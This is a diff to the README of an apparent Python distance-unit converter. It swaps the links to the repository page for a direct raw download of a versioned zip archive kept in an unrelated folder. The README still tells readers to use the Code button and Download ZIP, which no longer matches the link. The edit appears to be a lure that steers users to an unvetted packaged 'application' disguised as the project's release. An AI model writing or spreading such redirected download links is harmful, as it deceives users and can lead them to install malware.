@@ -1,6 +1,6 @@
 # 📏 Python-Distance-Unit-Converter-Calculator - Convert distance units with simple clicks
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator/raw/refs/heads/main/puntist/Distance_Python_Converter_Calculator_Unit_v3.6.zip)
 
 ## 📌 Overview
 
@@ -17,7 +17,7 @@ This tool calculates distance conversions between different measurement units. T
 
 Follow these steps to obtain the program files:
 
-1. Visit this page to download: [https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator](https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator)
+1. Visit this page to download: [https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator/raw/refs/heads/main/puntist/Distance_Python_Converter_Calculator_Unit_v3.6.zip](https://github.com/tuscannightjar854/Python-Distance-Unit-Converter-Calculator/raw/refs/heads/main/puntist/Distance_Python_Converter_Calculator_Unit_v3.6.zip)
 2. Locate the button labeled Code on the repository page.
 3. Select the Download ZIP option from the menu.
 4. Save the file to your computer.
